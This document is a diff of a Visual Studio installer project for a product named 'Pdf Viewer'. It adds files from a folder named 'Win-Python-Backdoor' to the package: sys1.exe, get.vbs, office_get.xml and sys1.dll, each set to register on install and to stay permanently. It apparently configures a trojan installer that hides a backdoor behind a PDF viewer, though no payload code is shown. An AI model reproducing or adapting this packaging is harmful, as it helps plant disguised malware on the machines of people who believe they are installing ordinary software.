@@ -21,6 +21,24 @@
         }
         "Entry"
         {
+        "MsmKey" = "8:_2588937B914A4D5A8B375816E64CCF13"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
+        "MsmKey" = "8:_4628F3632F3E4601BCC90A3B77FD94B5"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
+        "MsmKey" = "8:_474832C5FC544C90BF94BBD0225E614D"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
         "MsmKey" = "8:_5A8565E3FE8845C0B72ED8BE3087FF61"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
@@ -34,12 +52,6 @@
         "Entry"
         {
         "MsmKey" = "8:_9FA6268EC98F488C9F5E7BA92C346ACA"
-        "OwnerKey" = "8:_UNDEFINED"
-        "MsmSig" = "8:_UNDEFINED"
-        }
-        "Entry"
-        {
-        "MsmKey" = "8:_E7978D7D402B4788BF79FAAE1E211254"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
@@ -170,6 +182,66 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_2588937B914A4D5A8B375816E64CCF13"
+            {
+            "SourcePath" = "8:..\\..\\C++\\Release\\sys1.exe"
+            "TargetName" = "8:sys1.exe"
+            "Tag" = "8:"
+            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:TRUE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_4628F3632F3E4601BCC90A3B77FD94B5"
+            {
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\office_get.xml"
+            "TargetName" = "8:office_get.xml"
+            "Tag" = "8:"
+            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:TRUE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_474832C5FC544C90BF94BBD0225E614D"
+            {
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\get.vbs"
+            "TargetName" = "8:get.vbs"
+            "Tag" = "8:"
+            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:TRUE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_5A8565E3FE8845C0B72ED8BE3087FF61"
             {
             "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\libcrypto-1_1.dll"
@@ -214,26 +286,6 @@
             {
             "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\sys1.dll"
             "TargetName" = "8:sys1.dll"
-            "Tag" = "8:"
-            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
-            "Condition" = "8:"
-            "Transitive" = "11:FALSE"
-            "Vital" = "11:TRUE"
-            "ReadOnly" = "11:FALSE"
-            "Hidden" = "11:FALSE"
-            "System" = "11:FALSE"
-            "Permanent" = "11:TRUE"
-            "SharedLegacy" = "11:FALSE"
-            "PackageAs" = "3:1"
-            "Register" = "3:1"
-            "Exclude" = "11:FALSE"
-            "IsDependency" = "11:FALSE"
-            "IsolateTo" = "8:"
-            }
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_E7978D7D402B4788BF79FAAE1E211254"
-            {
-            "SourcePath" = "8:..\\..\\C++\\Release\\sys1.exe"
-            "TargetName" = "8:sys1.exe"
             "Tag" = "8:"
             "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
             "Condition" = "8:"
@@ -338,7 +390,7 @@
         "Name" = "8:Microsoft Visual Studio"
         "ProductName" = "8:Pdf Viewer"
         "ProductCode" = "8:{5A983143-6419-4883-9234-CFDE07F22AE5}"
-        "PackageCode" = "8:{08513058-FF4D-4B3E-9D37-8D658602C030}"
+        "PackageCode" = "8:{32CFCD76-9388-4998-B1BF-6A4891718B1D}"
         "UpgradeCode" = "8:{C3C953E8-4B5D-4005-9499-3D2A2CF54F8C}"
         "AspNetVersion" = "8:4.0.30319.0"
         "RestartWWWService" = "11:FALSE"
